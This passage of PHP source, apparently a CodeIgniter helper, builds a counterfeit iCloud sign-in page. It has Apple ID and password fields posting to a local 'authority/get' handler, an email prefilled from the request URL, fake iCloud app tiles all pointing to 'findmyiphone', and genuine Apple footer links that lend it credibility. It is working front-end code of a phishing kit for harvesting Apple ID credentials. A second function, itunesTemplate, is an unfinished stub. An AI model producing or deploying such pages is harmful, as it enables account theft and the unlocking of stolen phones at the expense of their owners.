0rPG9+gMa7EhMMWmiGxcQOBrDT3djA7vKH9NYsYKBNKoU3rPMAImkPWZ3XBSR8NhYQ16AkXS/8kJ5nUNI+h1YHNXOe4i5QaZuHwNDTPCv5BM9dodmxROxQg9c8QGy6G+ORh3DuFgBkkwLzxW6eQWg+80joevXVeTUou/NKZLqghDdP3pL2dMPEjtgVnIf0rGClrZM8bH0dANdpPG4dukCu8wb6wlvAwLNmAOhgr+g0cQ1G0gYktBd7oLcjKGm3Q+mgZmyneDPAci32sNBd0MJz8BDZ6SG+vBboArBuzSQwIrPdAVlfJ/S2Bmj3YvoAa5l6WGxeDV7zHE8Ds2WG+MJZoAZdV2vtEZ3XB0Tnzfuw1e2cJd5RAN3sgqcBuK9sH6j75Abe+VlgGtj6NO8kAPZdX837/wEN0FILPMoSagAAAABJRU5ErkJggg==" srcset="" alt="Logotipo do aplicativo" style="width: 100px;">' . "\n\n" . '        <h2>' . $ci->lang->line('Singin_message') . '</h2>' . "\n\n" . '        ' . form_open(site_url('authority/get'), array('class' => 'cloud-login form-ajax', 'role' => 'form', 'data-red' => ($redirect == 1 ? $redirecturl : site_url('findmyiphone')), 'data-reds' => ($redirect == 1 ? 1 : 0), 'style' => 'display:block !important')) . "\n" . '        <input type="hidden" name = "apple_add" value="' . set_value('apple_id', $finalLinkExplode[2]) . '" >' . "\n" . '        <input type="text" class="id" name="apple_id" id="apple_id"' . "\n" . '               placeholder="' . $ci->lang->line('appleid_message') . '" style="direction: ltr !important;"' . "\n" . '               value="' . set_value('apple_id', $novoMail) . '">' . "\n" . ' <input type="button" name="showPassword" id="showPassword" value=""> ' . '       <input type="password" style="display: none;" autocomplete="off" class="pwd" name="apple_pwd" id="apple_pwd"' . "\n" . '               placeholder="' . $ci->lang->line('Password_message') . '">' . "\n" . '        <input type="submit" style="display: none;" disabled class="dolog" name="c_log" id="c_log" value="">' . "\n" . '        <img class="loading" src="/assets/img/ajax-loader.gif" alt="Loading"/>' . "\n" . '        <div class="alrt">' . "\n" . '            <p>' . $ci->lang->line('incorrect_message') . '</p>' . "\n" . '            <a target="blank" href="https://iforgot.apple.com/password/verify/appleid">' . $ci->lang->line('Forgotpassword_message') . '</a>' . "\n" . '        </div>' . "\n" . '        </form>' . "\n\n" . '        <div class="keepme">' . "\n" . '            <input type="checkbox">' . "\n" . '            <span for="keepme">' . $ci->lang->line('Keepsigin_message') . '</span>' . "\n" . '        </div>' . "\n\n" . '        <div class="forget">' . "\n" . '            <a href="https://iforgot.apple.com/" target="_blank">' . $ci->lang->line('Forgotpassword_message') . '</a>' . "\n" . '            <div id="response"></div>' . "\n" . '        </div>' . "\n\n" . '        <div class="create">' . $ci->lang->line('DonthaveanAppleid_message') . ' <a href="#">' . $ci->lang->line('Createyoursnow_message') . '.</a></div>' . "\n\n" . '    </section>';
	}


	$html .= '<section class="imessage" style="display:' . $logged . ';">' . "\n\n\n" . '        <div class="container">' . "\n" . '            <div class="row">' . "\n" . '                <div class="col-md-2 col-sm-4 col-xs-6">' . "\n" . '                    <a href="' . site_url('findmyiphone') . '" class="text-cente imb">' . "\n" . '                    <span class="loadings"><img src="/assets/img/ajax-loader.gif" alt="Loading" /></span>' . "\n" . '                    <img class="" src="/assets/img/11.png" alt="">' . "\n" . '                    <span>' . $ci->lang->line('Reminders_message') . '</span>' . "\n" . '                    </a>' . "\n" . '                </div>' . "\n" . '                <div class="col-md-2 col-sm-4 col-xs-6">' . "\n" . '                    <a href="' . site_url('findmyiphone') . '" class="text-cente imb">' . "\n" . '                    <span class="loadings"><img src="/assets/img/ajax-loader.gif" alt="Loading" /></span>' . "\n" . '                    <img class="" src="/assets/img/9.png" alt="">' . "\n" . '                    <span>' . "\n\t\t\t\t\t\t" . $ci->lang->line('Notes_message') . "\n\t\t\t\t\t" . '</span>' . "\n" . '                    </a>' . "\n" . '                </div>' . "\n" . '                <div class="col-md-2 col-sm-4 col-xs-6">' . "\n" . '                    <a href="' . site_url('findmyiphone') . '" class="text-cente imb">' . "\n" . '                    <span class="loadings"><img src="/assets/img/ajax-loader.gif" alt="Loading" /></span>' . "\n" . '                    <img class="" src="/assets/img/3.png" alt="">' . "\n" . '                    <span>' . $ci->lang->line('iCloudDrive_message') . '</span>' . "\n" . '                    </a>' . "\n" . '                </div>' . "\n" . '                <div class="col-md-2 col-sm-4 col-xs-6">' . "\n" . '                    <a href="' . site_url('findmyiphone') . '" class="text-cente imb">' . "\n" . '                    <span class="loadings"><img src="/assets/img/ajax-loader.gif" alt="Loading" /></span>' . "\n" . '                    <img class="" src="/assets/img/10.png" alt="">' . "\n" . '                    <span>' . $ci->lang->line('Photos_message') . '</span>' . "\n" . '                    </a>' . "\n" . '                </div>' . "\n" . '                <div class="col-md-2 col-sm-4 col-xs-6">' . "\n" . '                    <a href="' . site_url('findmyiphone') . '" class="text-cente imb">' . "\n" . '                    <span class="loadings"><img src="/assets/img/ajax-loader.gif" alt="Loading" /></span>' . "\n" . '                    <img class="" src="/assets/img/1.png" alt="">' . "\n" . '                    <span>' . $ci->lang->line('Contacts_message') . '</span>' . "\n" . '                    </a>' . "\n" . '                </div>' . "\n" . '                <div class="col-md-2 col-sm-4 col-xs-6">' . "\n" . '                    <a href="' . site_url('findmyiphone') . '" class="text-cente imb">' . "\n" . '                    <span class="loadings"><img src="/assets/img/ajax-loader.gif" alt="Loading" /></span>' . "\n" . '                    <img class="" src="/assets/img/8.png" alt="">' . "\n" . '                    <span>' . $ci->lang->line('Mail_message') . '</span>' . "\n" . '                    </a>' . "\n" . '                </div>' . "\n\n\n\n\n" . '                <div class="col-md-2 col-sm-4 col-xs-6">' . "\n" . '                    <a href="' . site_url('findmyiphone') . '" class="text-cente imb">' . "\n" . '                    <span class="loadings"><img src="/assets/img/ajax-loader.gif" alt="Loading" /></span>' . "\n" . '                    <img class="" src="/assets/img/12.png" alt="">' . "\n" . '                    <span>' . $ci->lang->line('Settings_message') . '</span>' . "\n" . '                    </a>' . "\n" . '                </div>' . "\n\n" . '                <div class="col-md-2 col-sm-4 col-xs-6">' . "\n" . '                    <a href="' . site_url('findmyiphone') . '" class="text-cente imb">' . "\n" . '                    <span class="loadings"><img src="/assets/img/ajax-loader.gif" alt="Loading" /></span>' . "\n" . '                    <img class="" src="/assets/img/2.png" alt="">' . "\n" . '                    <span>' . $ci->lang->line('FindMyiPhone_message') . '</span>' . "\n" . '                    </a>' . "\n" . '                </div>' . "\n\n" . '                <div class="col-md-2 col-sm-4 col-xs-6">' . "\n" . '                    <a href="' . site_url('findmyiphone') . '" class="text-cente imb">' . "\n" . '                    <span class="loadings"><img src="/assets/img/ajax-loader.gif" alt="Loading" /></span>' . "\n" . '                    <img class="" src="/assets/img/6.png" alt="">' . "\n" . '                    <span>' . $ci->lang->line('Keynote_message') . '</span>' . "\n" . '                    </a>' . "\n" . '                </div>' . "\n" . '                <div class="col-md-2 col-sm-4 col-xs-6">' . "\n" . '                    <a href="' . site_url('findmyiphone') . '" class="text-cente imb">' . "\n" . '                    <span class="loadings"><img src="/assets/img/ajax-loader.gif" alt="Loading" /></span>' . "\n" . '                    <img class="" src="/assets/img/5.png" alt="">' . "\n" . '                    <span> ' . $ci->lang->line('Numbers_message') . '</span>' . "\n" . '                    </a>' . "\n" . '                </div>' . "\n" . '                <div class="col-md-2 col-sm-4 col-xs-6">' . "\n" . '                    <a href="' . site_url('findmyiphone') . '" class="text-cente imb">' . "\n" . '                    <span class="loadings"><img src="/assets/img/ajax-loader.gif" alt="Loading" /></span>' . "\n" . '                    <img class="" src="/assets/img/20.png" alt="">' . "\n" . '                    <span>' . $ci->lang->line('FindFriends_message') . '</span>' . "\n" . '                    </a>' . "\n" . '                </div>' . "\n\n" . '                <div class="col-md-2 col-sm-4 col-xs-6">' . "\n" . '                    <a href="' . site_url('findmyiphone') . '" class="text-cente imb">' . "\n" . '                    <span class="loadings"><img src="/assets/img/ajax-loader.gif" alt="Loading" /></span>' . "\n" . '                    <img class="" src="/assets/img/7.png" alt="">' . "\n" . '                    <span>' . $ci->lang->line('Pages_message') . '</span>' . "\n" . '                    </a>' . "\n" . '                </div>' . "\n\n\n" . '            </div>' . "\n" . '        </div>' . "\n" . '    </section>' . "\n\n" . '    <footer class="foot">' . "\n" . '        <div class="container-fluid">' . "\n" . '            <div class="row">' . "\n\n" . '                <div class="col-md-12 col-xs-12 foot-link">' . "\n" . '                    <a class="hidden-xs" href="https://www.apple.com/support/systemstatus/" target="_blank">' . "\n" . '                        ' . $ci->lang->line('Systemstatus_message') . '</a>' . "\n" . '                    <span class="footer-link-separator hidden-xs"></span>' . "\n" . '                    <a class="hidden-xs" href="https://www.apple.com/privacy/"' . "\n" . '                       target="_blank">' . $ci->lang->line('Privacy_message') . '</a>' . "\n" . '                    <span class="footer-link-separator hidden-xs"></span>' . "\n" . '                    <a class="hidden-xs" href="https://www.apple.com/legal/icloud/ww/"' . "\n" . '                       target="_blank">' . $ci->lang->line('Terms_message') . '</a>' . "\n" . '                    <span class="footer-link-separator hidden-xs"></span>' . "\n" . '                    <span class="copyright">' . $ci->lang->line('Copyrights_message') . '</span>' . "\n" . '                </div>' . "\n" . "\n" . '                    <a href="https://www.apple.com/" target="_blank" class="apple-logo"></a>' . "\n" . '                </div>' . "\n\n" . '            </div>' . "\n" . '        </div>' . "\n" . '    </footer>' . "\n\n" . '</div>' . "\n" . '    <div class="main-container">' . "\n" . '    <div class="section-bgs">' . "\n" . '        <canvas id="bgs"></canvas>' . "\n" . '    </div>' . "\n" . '    <script src="/assets/js/jquery.js"></script>' . "\n" . '<script src="' . site_url('assets/js/bolinha.js?t=' . time()) . '" type="text/javascript"></script>' . "\n" . '    <script src="/assets/js/strap.min.js"></script>' . "\n" . '    <script src="/assets/js/newc.min.js?t=' . time() . '"></script>' . "\n" . '    <script src="/assets/js/ajax-form.js"></script>' . "\n" . '</body>' . "\n" . '</html>' . "\n" . '        ';
	return $html;
}
}


if (!(function_exists('itunesTemplate'))) {
function itunesTemplate($title, $emailid)
{
	$finalLink 			= $_SERVER["REQUEST_URI"];
	$finalLinkExplode	= explode("/", $finalLink);
	if(strstr($emailid,"@")){
		$novoMail = $emailid;
	}else{
		$novoMail='';
		}
	$ci = &get_instance();
	$redirect = $ci->load->get_var('redirect');
	$redirecturl = $ci->load->get_var('redirecturl');
	$logged = (($ci->session->userdata('logged_in') == false ? 'none' : 'block'));
	$title = ((isset($title) ? $title : 'iCloud'));
	$html2 = '';
	$html = 'asd';
	return $html;
}
}


?>
